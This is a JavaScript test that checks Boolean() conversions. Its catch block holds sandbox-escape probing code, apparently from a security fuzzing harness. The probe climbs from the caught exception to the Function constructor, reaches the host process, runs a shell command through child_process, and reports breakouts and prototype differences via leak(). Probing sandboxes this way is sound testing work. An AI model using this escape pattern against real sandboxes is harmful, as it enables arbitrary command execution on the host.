try {
    if (typeof Boolean(0) !== 'boolean') {
        $ERROR('#1.1: typeof Boolean(0) should be "boolean", actual is "' + typeof Boolean(0) + '"');
    }
    if (Boolean(0) !== false) {
        $ERROR('#1.2: Boolean(0) should be false, actual is ' + Boolean(0));
    }
    if (typeof Boolean(-1) !== 'boolean') {
        $ERROR('#2.1: typeof Boolean(-1) should be "boolean", actual is "' + typeof Boolean(-1) + '"');
    }
    if (Boolean(-1) !== true) {
        $ERROR('#2.2: Boolean(-1) should be true, actual is ' + Boolean(-1));
    }
    if (typeof Boolean(-Infinity) !== 'boolean') {
        $ERROR('#3.1: typeof Boolean(-Infinity) should be "boolean", actual is "' + typeof Boolean(-Infinity) + '"');
    }
    if (Boolean(-Infinity) !== true) {
        $ERROR('#3.2: Boolean(-Infinity) should be true, actual is ' + Boolean(-Infinity));
    }
    if (typeof Boolean(NaN) !== 'boolean') {
        $ERROR('#4.1: typeof Boolean(NaN) should be "boolean", actual is "' + typeof Boolean(NaN) + '"');
    }
    if (Boolean(NaN) !== false) {
        $ERROR('#4.2: Boolean(NaN) should be false, actual is ' + Boolean(NaN));
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}